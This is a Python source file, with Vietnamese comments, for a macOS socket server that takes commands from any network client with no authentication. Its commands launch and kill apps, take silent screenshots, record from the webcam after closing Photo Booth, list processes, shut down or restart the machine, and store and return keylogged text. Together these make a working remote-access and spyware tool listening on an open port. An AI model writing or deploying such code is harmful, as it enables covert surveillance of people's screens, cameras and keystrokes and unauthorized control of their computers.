import socket
import subprocess
import threading
import time
import os
from datetime import datetime
import cv2
import json

HOST = "0.0.0.0"
PORT = 5001

# --- HÀM QUÉT APP (GIỮ NGUYÊN) ---
def scan_installed_apps():
    found_apps = {}
    app_dirs = ["/Applications", "/System/Applications", "/System/Applications/Utilities", os.path.expanduser("~/Applications")]
    print("[INFO] Scanning for installed applications...")
    for d in app_dirs:
        if not os.path.exists(d): continue
        try:
            for item in os.listdir(d):
                if item.endswith(".app"):
                    app_name = os.path.splitext(item)[0]
                    found_apps[app_name.lower()] = app_name
        except Exception as e: print(f"[WARNING] Could not scan {d}: {e}")
    return dict(sorted(found_apps.items(), key=lambda item: item[1]))

APPS = scan_installed_apps()

# --- CÁC HÀM START/STOP/CHECK (GIỮ NGUYÊN) ---
def is_app_running(name):
    try:
        subprocess.check_output(["pgrep", "-f", name])
        return True
    except:
        return False

def start_app(app_name):
    if is_app_running(app_name): return f"[INFO] {app_name} already running"
    try:
        subprocess.run(["open", "-a", app_name], check=True)
        time.sleep(1)
        return f"[OK] Started {app_name}"
    except Exception as e: return f"[ERROR] Failed to start {app_name}: {e}"

def stop_app(app_name):
    subprocess.run(["osascript", "-e", f'quit app "{app_name}"'])
    time.sleep(0.5)
    if not is_app_running(app_name): return f"[OK] Stopped {app_name}"
    subprocess.run(["pkill", "-f", app_name], check=False)
    return f"[OK] Attempted to stop {app_name}"

def take_screenshot():
    try:
        os.makedirs("screenshots", exist_ok=True)
        filename = f"screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        subprocess.run(["screencapture", "-x", filename])
        return f"[OK] Screenshot saved: {filename}"
    except Exception as e: return f"[ERROR] Screenshot failed: {e}"

def record_webcam(seconds):
    # (Giữ nguyên code record_webcam cũ của bạn)
    cap = None
    out = None
    try:
        subprocess.run(["killall", "Photo Booth"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return "[ERROR] Could not open webcam"
        os.makedirs("recordings", exist_ok=True)
        filename = f"recordings/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (width, height))
        start = time.time()
        while (time.time() - start) < seconds:
            ret, frame = cap.read()
            if ret: out.write(frame)
            else: break
        return f"[OK] Saved to {filename}"
    except Exception as e: return f"[ERROR] {e}"
    finally:
        if cap: cap.release()
        if out: out.release()
        cv2.destroyAllWindows()

def shutdown_machine():
    subprocess.Popen(["sudo", "shutdown", "-h", "now"])
    return "[OK] Shutdown sent"

def restart_machine():
    subprocess.Popen(["sudo", "shutdown", "-r", "now"])
    return "[OK] Restart sent"

def get_process_list():
    try:
        cmd = "ps -Aceo pid,pcpu,comm -r | head -n 50"
        output = subprocess.check_output(cmd, shell=True, text=True)
        lines = output.strip().split('\n')
        cleaned = ["PID COMMAND %CPU"]
        for line in lines[1:]:
            parts = line.split(None, 2)
            if len(parts) < 3: continue
            pid, cpu, raw = parts[0], parts[1], parts[2]
            name = raw.split('(')[0].strip() if '(' in raw else raw.strip()
            cleaned.append(f"{pid} {name} {cpu}")
        return "\n".join(cleaned)
    except Exception as e: return f"[ERROR] {e}"

# --- MAIN SERVER LOGIC ---
def handle_client(conn, addr):
    print(f"Client {addr} connected.")
    while True:
        try:
            data = conn.recv(4096).decode().strip()
            if not data: break
            parts = data.split()
            command = parts[0].lower()

            if command == "list_apps":
                # --- LOGIC MỚI: KIỂM TRA TRẠNG THÁI TỪNG APP ---
                app_status_list = {}
                for key, name in APPS.items():
                    app_status_list[key] = {
                        "name": name,
                        "running": is_app_running(name)
                    }
                result = json.dumps(app_status_list)
                # -----------------------------------------------

            elif command == "webcam_record":
                if len(parts) < 2: result = "[ERROR] args"
                else: result = record_webcam(int(parts[1]))

            elif command in ("start", "stop"):
                if len(parts) < 2: result = "[ERROR] no app"
                else:
                    key = " ".join(parts[1:]).lower()
                    name = APPS.get(key, " ".join(parts[1:]))
                    result = start_app(name) if command == "start" else stop_app(name)
            
            elif command == "screenshot": result = take_screenshot()
            elif command == "list_processes": result = get_process_list()
            elif command == "shutdown": result = shutdown_machine()
            elif command == "restart": result = restart_machine()
            elif command == "keylog_web":
                with open("web_keylog.txt", "a") as f: f.write((parts[1] if len(parts)>1 else "")+'\n')
                conn.sendall(b"OK"); continue
            elif command == "keylog_data":
                try: 
                    with open("web_keylog.txt") as f: result=f.read()
                except: result=""
                conn.sendall(result.encode()); continue
            else: result = "[ERROR] Unknown"
            
            conn.sendall(result.encode())
        except: break
    conn.close()

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"Server on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__": 
    start_server()